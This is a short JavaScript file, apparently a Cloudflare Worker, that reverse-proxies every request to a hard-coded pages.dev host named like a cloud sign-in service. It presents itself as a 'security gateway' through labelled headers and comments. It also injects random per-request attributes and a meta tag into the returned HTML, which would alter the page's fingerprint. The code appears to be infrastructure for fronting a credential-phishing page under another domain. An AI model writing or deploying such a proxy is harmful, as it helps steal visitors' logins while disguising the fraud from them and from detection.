class SecurityHandler {

  element(element) {

    // Random security token
    const token =
      crypto.randomUUID();

    // Add dynamic attribute
    element.setAttribute(
      "data-secure",
      token
    );

  }
}

class MetaHandler {

  element(element) {

    element.append(
      `<meta name="gateway" content="protected-session">`,
      { html: true }
    );

  }
}

export default {

  async fetch(request) {

    const origin =
      "https://e394115f.signins-cloudservice-index.pages.dev/";

    const url =
      new URL(request.url);

    const target =
      origin +
      url.pathname +
      url.search;

    // Fetch origin
    const response =
      await fetch(target, request);

    // Only rewrite HTML
    const contentType =
      response.headers.get("content-type") || "";

    if (!contentType.includes("text/html")) {
      return response;
    }

    // Clone response
    const secure =
      new Response(response.body, response);

    // Security headers
    secure.headers.set(
      "X-Frame-Options",
      "DENY"
    );

    secure.headers.set(
      "X-Content-Type-Options",
      "nosniff"
    );

    secure.headers.set(
      "Referrer-Policy",
      "strict-origin-when-cross-origin"
    );

    secure.headers.set(
      "Content-Security-Policy",
      "default-src 'self'; img-src * data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'"
    );

    secure.headers.set(
      "X-Security-Gateway",
      "ACTIVE"
    );

    // Rewrite HTML
    return new HTMLRewriter()

      // Add dynamic attrs
      .on("body", new SecurityHandler())

      .on("main", new SecurityHandler())

      .on("section", new SecurityHandler())

      .on("head", new MetaHandler())

      .transform(secure);

  }
}